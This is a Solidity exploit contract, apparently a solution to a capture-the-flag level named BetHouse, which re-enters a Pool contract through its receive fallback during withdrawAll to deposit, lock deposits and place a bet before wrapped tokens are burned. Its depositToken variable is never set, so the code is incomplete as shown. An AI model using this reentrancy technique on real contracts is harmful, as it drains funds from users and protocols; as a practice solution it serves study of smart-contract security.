// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Pool} from "./Pool.sol";
import {BetHouse} from "./BetHouse.sol";
import {PoolToken} from "./PoolToken.sol";

/**Overall I need this contract to get those additional 5 PDT and then send them to
    my wallet. So I can make my wallet the bettor which is the target of the level */
 
contract BetHouseSolver {
    Pool pool;
    BetHouse betHouse;
    PoolToken depositToken;
    address player;

    constructor (address _betHouse, address _player) {
        betHouse = BetHouse(_betHouse);
        pool = Pool(betHouse.pool());
        player = _player;
    } 

    receive() external payable{
        // Suggesting needed eth are assign when deploying this contract
        // and some deposit tokens are transferred before running this function.
        depositToken.approve(address(pool), 5); //!!!
        pool.deposit(5);
        pool.lockDeposits();
        betHouse.makeBet(player);
        // Withdraw ether
        player.call{value: address(this).balance}("");
    }

    function attack() public {
        // - Approve 5 deposit tokens
        depositToken.approve(address(pool), 5);
        // - Call deposit function
        pool.deposit{value: 0.001 ether}(5);
        // - Call withdrawAll function
        pool.withdrawAll();
        // - The next 2 are executed before the withdrawAll burns wrappedToken!
        // - Call deposit again - in the receive fallback!
        // - Call makeBet function for player address  - in the receive fallback!
    }
} 